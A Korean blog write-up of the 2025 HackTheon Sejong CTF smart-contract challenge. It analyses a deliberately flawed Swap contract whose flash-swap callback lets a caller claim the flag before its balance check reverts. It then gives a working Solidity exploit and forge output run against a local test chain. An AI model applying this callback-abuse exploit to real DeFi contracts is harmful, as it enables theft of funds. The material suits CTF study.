---
layout: post
title: "2025 핵테온 contract"
tags: blockchain HackTheon foundry contract flashloan
---

[contract.zip]({{site.url}}/images/2025-04-27-HackTheon_contract/contract.zip)

2025 헥테온 세종에 출제되었던 contract 문제이다.

서버가 닫혔지만 도커파일과 함께 파일을 받아 로컬에서 다시 풀어보려한다.

# 문제 분석

---

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import {WETH} from "../src/WETH.sol";
import {HTOToken} from "../src/HTOToken.sol";
import {DepositNFT} from "../src/DepositNFT.sol";
import {VestingNFT} from "../src/VestingNFT.sol";
import {YieldVault} from "../src/YieldVault.sol";
import {Swap} from "../src/Swap.sol";

contract DeployScript is Script {
    function run() public {
        vm.startBroadcast();
        WETH wETH = new WETH();
        console.log("wETH deployed at:", address(wETH));
        
        HTOToken htoToken = new HTOToken();
        console.log("HTOToken deployed at:", address(htoToken));

        
        DepositNFT depositNFT = new DepositNFT();
        console.log("DepositNFT deployed at:", address(depositNFT));

        
        VestingNFT vestingNFT = new VestingNFT();
        console.log("VestingNFT deployed at:", address(vestingNFT));
        
        YieldVault yieldVault = new YieldVault(
            address(wETH),
            address(htoToken),
            address(depositNFT),
            address(vestingNFT)
        );
        console.log("YieldVault deployed at:", address(yieldVault));

        wETH.mint(address(yieldVault), 255); 
        htoToken.mint(address(yieldVault), 340282366920938463463374607431768211455); 

        depositNFT.transferOwnership(address(yieldVault));
        vestingNFT.transferOwnership(address(yieldVault));

        Swap swap = new Swap(address(wETH), address(htoToken));
        console.log("Swap deployed at:", address(swap));

        wETH.mint(address(swap), 4294967295); 
        htoToken.mint(address(swap), 18446744073709551615); 

        vm.stopBroadcast();
    }
}
```

`script/Deploy.s.sol`에서는 문제를 배포하기 위한 세팅을 해주고 있다.

문제를 위한 contract의 address를 출력한 이후에는 `src/WETH.sol`의 `mint` 함수를 실행하고 있다.

## src/WETH.sol

---

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;
import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";
import { ERC20 } from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import { Ownable } from "@openzeppelin/contracts/access/Ownable.sol";

contract WETH is ERC20, Ownable {
    constructor() ERC20("Wrapping ETH", "WETH") Ownable(msg.sender) {
    }

    function mint(address sender, uint256 amount) external onlyOwner {
        _mint(sender, amount);
    }

    function flag() external returns (string memory) {
        if(this.balanceOf(msg.sender) > 100000000) {
            _burn(msg.sender, 100000000);
            return "FLAG{THIS_IS_FAKE_FLAG}";
        }
        return "";
    }
}

```

`src/WETH.sol` 코드는 다음과 같으며 해당 파일에서 flag 함수로 FLAG를 얻을 수 있을 것으로 보인다.

### mint 함수

---

`mint` 함수는 `_mint` 함수를 다시 호출하고 있으며 이 함수가 어떤 기능을 하는지 찾기 위해 검색해보면

```solidity
function _mint(address account, uint256 value) internal {
    if (account == address(0)) {
        revert ERC20InvalidReceiver(address(0));
    }
    _update(address(0), account, value);
}
```

다음과 같은 코드를 볼 수 있었다. 

`script/Deploy.s.sol` 에서 볼 수 있듯이 `account` 변수로 `address(yieldVault)` 를 전달 받았기에 바로 `_update` 함수로 가보면 

```solidity
function _update(address from, address to, uint256 value) internal virtual {
    if (from == address(0)) {
        // Overflow check required: The rest of the code assumes that totalSupply never overflows
        _totalSupply += value;
    } else {
        uint256 fromBalance = _balances[from];
        if (fromBalance < value) {
            revert ERC20InsufficientBalance(from, fromBalance, value);
        }
        unchecked {
            // Overflow not possible: value <= fromBalance <= totalSupply.
            _balances[from] = fromBalance - value;
        }
    }

    if (to == address(0)) {
        unchecked {
            // Overflow not possible: value <= totalSupply or value <= fromBalance <= totalSupply.
            _totalSupply -= value;
        }
    } else {
        unchecked {
            // Overflow not possible: balance + value is at most totalSupply, which we know fits into a uint256.
            _balances[to] += value;
        }
    }

    emit Transfer(from, to, value);
}
```

`uint256 private _totalSupply`  변수에 입력받은 255를 저장한 뒤, `address(yieldVault)` 의 `_balance` 값을 255 더해주는 것을 볼 수 있다. 

이때 `unchecked` 로 감싸져 있으므로 오버플로우 취약점이 발생할 수 있지만 코드 상에서 이로 인한 오버플로우가 발생할 가능성은 없어보인다.

`_balances`는 다음과 같다.

```solidity
mapping(address account => uint256) private _balances;
```

---

이로 인해 `mint` 함수는 주소에 입력한 만큼의 토큰을 생성해준다는 것을 알 수 있었다.

## src/Swap.sol

---

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { ReentrancyGuard } from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

import { WETH } from "./WETH.sol";
import { HTOToken } from "./HTOToken.sol";

interface IUniswapV2Callee {
  function uniswapV2Call(address sender, uint amount0Out, uint amount1Out, bytes calldata data) external;
}

contract Swap is ReentrancyGuard {
  WETH public wETH; 
  HTOToken public htoToken;

  constructor(address _wETH, address _htoToken) {
    wETH = WETH(_wETH);
    htoToken = HTOToken(_htoToken);
  }

  function _getExchange(uint amount0Out, uint amount1Out) public returns (uint) {
    return amount0Out != 0 ? amount0Out * 2 : amount1Out / 2; 
  }

  function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external nonReentrant {
    address _from;
    address _to;
    uint _amount;

    if (amount0Out != 0) {
      _from = address(wETH);
      _to = address(htoToken);
      _amount = amount0Out;
    } else {
      _to = address(wETH);
      _from = address(htoToken);
      _amount = amount1Out;
    }

    if (data.length == 0) {
      IERC20(_to).transfer(to, _getExchange(amount0Out, amount1Out));
      IERC20(_from).transferFrom(to, address(this), _amount);
    } else {
      uint balanceBefore = IERC20(_from).balanceOf(address(this));

      IERC20(_from).transfer(to, _amount);
  
      IUniswapV2Callee(to).uniswapV2Call(to, amount0Out, amount1Out, data);

      uint balanceAfter = IERC20(_from).balanceOf(address(this));

      require(balanceAfter >= balanceBefore);
    }
  }
}

```

`swap` 함수에서 전달받은 `amount0Out` 변수를 통해 0인지 아닌지에 따라 `wETH`에서 `htoTokend`으로 보낼지, `htoToken`에서 `wETH`로 보낼지를 결정하고 있다.

그 다음  `data.length` 가 0이면 `to`로 먼저 `_to`의 토큰을 보낸 뒤, `_from`  으로 부터 토큰을 받아온다.

여기서 Checks-Effectes Interaction 패턴이 적용되지 않아 `_to`의 토큰을 먼저 보낸 뒤, `_from` 의 토큰을 받아오고 있어 `_from`의 토큰이 충분하지 않아도 값을 보낼 수 있어 보인다.

### transferFrom 함수

---

```solidity
function transferFrom(address from, address to, uint256 value) public virtualreturns (bool) {
    address spender = _msgSender();
    _spendAllowance(from, spender, value);
    _transfer(from, to, value);
    return true;
}
```

`transferFrom`  함수는 다음과 같으며 아까의 `mint` 함수와 같이

```solidity
function _transfer(address from, address to, uint256 value) internal {
    if (from == address(0)) {
        revert ERC20InvalidSender(address(0));
    }
    if (to == address(0)) {
        revert ERC20InvalidReceiver(address(0));
    }
    _update(from, to, value);
}
```

`_transfer` 함수를 거쳐 `_update` 함수로 진입한다.

```solidity
function _update(address from, address to, uint256 value) internal virtual {
    if (from == address(0)) {
        // Overflow check required: The rest of the code assumes thattotalSupply never overflows
        _totalSupply += value;
    } else {
        uint256 fromBalance = _balances[from];
        if (fromBalance < value) {
            revert ERC20InsufficientBalance(from, fromBalance, value);
        }
        unchecked {
            // Overflow not possible: value <= fromBalance <= totalSupply.
            _balances[from] = fromBalance - value;
        }
    }

    if (to == address(0)) {
        unchecked {
            // Overflow not possible: value <= totalSupply or value <=fromBalance <= totalSupply.
            _totalSupply -= value;
        }
    } else {
        unchecked {
            // Overflow not possible: balance + value is at most totalSupply,which we know fits into a uint256.
            _balances[to] += value;
        }
    }

    emit Transfer(from, to, value);
}
```

`_update` 함수에서 토큰이 보내려고 하는 값보다 적은 경우일때 8번째 줄에서 `revert` 하고 있으므로 solidity의 원자성에 의해 토큰이 충분하지 않을 때 발생할 수 있는 취약점은 없어 보인다.

---

 `_getExchange` 함수를 보면 `wETH`에서  `htoToken` 으로 보낼 때는 토큰을 2배로 보내지만, 반대일 때는 1/2배 보내는 것을 볼 수 있다.

`data.length` 가 0이 아닌 경우에는 `_from` 토큰의 개수를 `balanceBefore` 변수에 저장한 뒤, 토큰을 보낸다.

이후 IUniswapV2Callee contract의  `uniswapV2Call` 함수를 실행하고 있다.

### uniswapV2Call 함수

---

구글링을 통해 문서를 찾을 수 있었다.

[Flash Swaps Uniswap](https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps)

flash loan이 가능하게 하고 있었고 이전 `data.length`가 0일때 기능과 크게 차이가 나보이지 않는다.

---

Swap을 통해 wETH의 `balanceOf`를 100000000 이상으로 만든 뒤 FLAG를 우선 얻는다면 후에 `swap` 함수에서 `revert` 가 발생하여도 FLAG를 얻을 수 있다.

# Exploit

---

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import { IUniswapV2Callee } from "../src/Swap.sol";
import { Swap } from "../src/Swap.sol";
import { WETH } from "../src/WETH.sol";

contract Ex is IUniswapV2Callee {
    Swap public swap_ = Swap(0x8A791620dd6260079BF849Dc5567aDC3F2FdC318);
    WETH public weth_ = WETH(0x5FbDB2315678afecb367f032d93F642f64180aa3);
    address public immutable owner;
    string public flag;

    function ex() external {
        try swap_.swap(100_000_001, 0, address(this), abi.encode("mingw")) {

        } catch {

        }
    }

    function uniswapV2Call(address, uint amount0Out, uint, bytes calldata) external override {
        flag = weth_.flag();
        console.log("FLAG: ", flag);
    }
}

contract Exploit is Script {
    function run() external {
        vm.startBroadcast();

        Ex ex = new Ex();
        ex.ex();

        vm.stopBroadcast();
    }
}

```

코드를 작성하던 도중 `swap` 함수에서 `uniswapV2Call` 함수가 구체적으로 정의가 되어있는것이 아닌 `interface`를 통해 호출되어 있었고 `override`해서 FLAG의 값을 불러올 수 있었다.
`receive`로 풀이하는 것보다 `override` 를 통해  FLAG 값을 가져오도록 한 뒤 `swap` 함수는 오류가 발생하지만 상관 없이 try catch로 날려 주었다.

```bash
$ forge script script/Exploit.sol:Exploit --broadcast --rpc-url http://127.0.0.1:12455 --private-key 0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d
[⠊] Compiling...
[⠰] Compiling 1 files with Solc 0.8.29
[⠔] Solc 0.8.29 finished in 260.23ms
Compiler run successful with warnings:
Warning (5667): Unused function parameter. Remove or comment out the variable name to silence this warning.
  --> script/Exploit.sol:24:37:
   |
24 |     function uniswapV2Call(address, uint amount0Out, uint, bytes calldata) external override {
   |                                     ^^^^^^^^^^^^^^^

Warning (2018): Function state mutability can be restricted to pure
  --> src/Swap.sol:23:3:
   |
23 |   function _getExchange(uint amount0Out, uint amount1Out) public returns (uint) {
   |   ^ (Relevant source part starts here and spans across multiple lines).

Warning: Detected artifacts built from source files that no longer exist. Run `forge clean` to make sure builds are in sync with project files.
 - /home/mingw/contract-hacktheon/script/ExploitScript.s.sol
Script ran successfully.

== Logs ==
  FLAG:  FLAG{THIS_IS_FAKE_FLAG}

## Setting up 1 EVM.

==========================

Chain 31337

Estimated gas price: 0.266981935 gwei

Estimated total gas used for script: 1313610

Estimated amount required: 0.00035071013963535 ETH

==========================

##### anvil-hardhat
✅  [Success] Hash: 0xed31043ebf8e104ee72068750450bea6779c95b68cacf202df7e6c2e7c41f481
Block: 19
Paid: 0.000012110491581919 ETH (117379 gas * 0.103174261 gwei)

##### anvil-hardhat
✅  [Success] Hash: 0x77ee82294078a8cce1ff60eb0bce0a09e5056650195371a1cad40f96c73d5339
Contract Address: 0x0f5D1ef48f12b6f691401bfe88c2037c690a6afe
Block: 18
Paid: 0.000102718077731487 ETH (878419 gas * 0.116935173 gwei)

✅ Sequence #1 on anvil-hardhat | Total Paid: 0.000114828569313406 ETH (995798 gas * avg 0.110054717 gwei)

==========================

ONCHAIN EXECUTION COMPLETE & SUCCESSFUL.
```